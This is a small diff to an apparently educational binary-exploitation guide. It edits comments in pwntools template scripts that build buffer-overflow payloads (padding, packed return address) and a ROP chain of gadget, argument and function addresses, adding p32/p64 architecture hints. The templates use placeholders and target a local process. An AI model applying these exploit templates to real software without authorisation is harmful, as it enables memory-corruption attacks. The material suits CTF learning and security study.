@@ -27,7 +27,7 @@ from pwn import *            # import pwntools
 p = process('./name_of_the_process')        # to interact with the process
 
 payload = b'A' * n       # n is the number of bytes for the padding
-payload += p32(address_to_go)   # pack the address of the function to execute
+payload += p32(address_to_go)   # pack the address of the function to execute (p64 if arch is 64-bit, you can check with checksec)
 
 p.sendline(payload)
 # if the function to execute is the opening of a shell then you need to add also:
@@ -154,7 +154,7 @@ We are now ready to make our python script using pwntools:
 from pwn import *
 
 padding = b'A' * offset    #offset found in step 2 with gdb's cyclic pattern
-gadget = p64(addr_of_the_gadget)    #addr_of_the_gadget found with ROPgadget in step 3, and it's in the form 0x... (without " ")
+gadget = p64(addr_of_the_gadget)    #addr_of_the_gadget found with ROPgadget in step 3, and it's in the form 0x... (without " ")   (p32 if arch is 32-bit, check with checksec)
 argument = p64(addr_of_argument)    #addr_of_argument found with radare2 in step 3, and it's theaddress of the parameter (usually of a register) we need in the gadget above
 function_to_call = p64(addr_of_function)       #addr_of_function found with radare2 in step 4, and it's the address of the function we want to call
 
